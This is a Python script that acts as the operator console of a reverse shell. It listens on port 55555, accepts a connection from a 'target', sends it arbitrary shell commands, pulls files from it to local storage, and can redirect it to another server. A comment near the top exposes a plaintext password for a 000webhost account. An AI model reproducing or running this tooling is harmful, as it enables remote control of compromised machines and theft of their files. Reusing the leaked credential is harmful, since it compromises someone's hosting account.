#!/usr/bin/python
#-*-coding:utf8;-*-
#qpy:console
import socket
import time
import sys
import os

# password of 000webhost = (#yT8w5JFz^*K6ELf)AVK)

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'


def clear():
    os.system("clear")
#ATOM
clear()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

global host
global port

host = ""
port = 55555
try:
    s.bind((host,port))

    print("[WAITING FOR THE CONNECTION...]")
    s.listen(5)

    (conn,addr) = s.accept()
    print("[TARGET ADDRS = {}]".format(addr))

except Exception as e:
    print("[!][!] ",e)
    exit()

except KeyboardInterrupt:
    clear()
    print("[KEYBOAD INTERRUPT Ctrl + C] Waite...")
    input("[Peres_Enter_To_Exit...]")
    clear()
    exit(0)

help = """\n\t\t-------------- Help ------------------\n
    Commands\t\tUse\t\t\t\tExamples

    l-host\t\tlocal-host <command>\t\tlocal-host ls
    send      \t\tsend <file name>   \t\tsend music.mp4
    server\t\tserver <IP:PORT>   \t\tserver 127.0.0.1:468

    For more information type the name of the command
    """
def Help(com):

    if com == "l-host":
        print("Commands\t\tUse\n")
        print("l-host\t\tl-host <command> : Executing command on localhost or current hosting machine")
        print("\nExample : l-host ls or pwd any Linux command")

    elif com == "send":
        print("Commands\t\tUse\n")
        print("send      \t\tsend <file name> : send file to the host")
        print("\nExample : send music.mp3 or send dir_name1/dir_name2/music.mp3")
    elif com == "server":
        print("Commands\t\tUse\n")
        print("server      \t\tserver <IP:PORT> ")
        print("\nExample : server 127.0.0.1:7382")
    else:
        print(help)

def LocalHost(com):
    print("\n\n\n"+"-"*50)
    print("[.......BEGINNING EXECUTING COMMAND ON LOCALHOST.......]")
    print("-"*50,"\n")

    if com[:2] == "cd":
        try:
            os.chdir(com[3:])
        except Exception as e:
            print(e)

    elif com[:2] == "ls":
        com = ("ls --color" + com[3:])
        os.system(com)

    else:
        os.system(com)
    print("\n"+"-"*50)
    print("[...................END OF EXECUTING...................]")
    print("-"*50,"\n\n\n")

def recive():
    print("sending...")
    file_name = conn.recv(100).decode()
    file_siz = conn.recv(100).decode()

    with open("/sdcard/received/"+file_name,"wb") as file:

        #The time when the data start recving 
        start_time = time.time()

        while True:
            data = conn.recv(1024)
            if not(data):
                break
            file.write(data)
                
        #The time when the data stop recving
        end_time = time.time()

    print("File send successfully in ", end_time - start_time)

while True:

    try:
        com = input("[<{}> Net-cat]> ".format(addr[0]))
        if com[:4]=="send":

            if len(com) == 4:
                Help(com)
            else:
                conn.send(str.encode(com))
                recive()

        elif com[:6] == "l-host":

            if len(com) == 6:
                Help(com)

            else:
                com = com[7:]
                LocalHost(com)

        elif com == "help":
            Help(com)
        elif com[:6] == "server":
            if len(com) == 6:
                Help(com)
            else:
                if ":" in com:
                    conn.send(str.encode(com))
                else:
                    print("Invalid addres!!")
        else:
            if com == "" or com == (" " * len(com)):
                com = "echo '[!][!] cannot execute empty commands :p'"

            conn.send(str.encode(com))

            if com == "exit" or com == "quite":
                input("[Peres_Enter_To_Exit...]")
                print("[EXITING... Good Bay...]")
                conn.send(str.encode(com))
                break
            m = str(conn.recv(999999999),"utf-8")
            print(m)

    except Exception as e:
        print(e)

    except KeyboardInterrupt:
        clear()
        print("[KEYBOAD INTERRUPT Ctrl + C] Waite...")
        input("[Peres_Enter_To_Continuse...]")
        clear()
        pass

conn.close()
s.close()
